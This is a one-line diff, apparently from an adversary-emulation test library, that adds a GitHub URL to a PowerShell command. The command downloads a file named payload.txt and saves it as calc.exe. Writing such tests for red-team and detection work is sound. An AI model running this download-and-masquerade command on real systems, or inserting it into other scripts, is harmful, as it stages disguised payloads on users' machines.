@@ -1,1 +1,1 @@
-powershell -version 2 -nop -NoLogo -Command "(new-object System.Net.WebClient).DownloadFile('', 'calc.exe')"
+powershell -version 2 -nop -NoLogo -Command "(new-object System.Net.WebClient).DownloadFile('https://github.com/noperle/atomic-red-team/blob/master/atomics/T1204.002/src/payload.txt', 'calc.exe')"
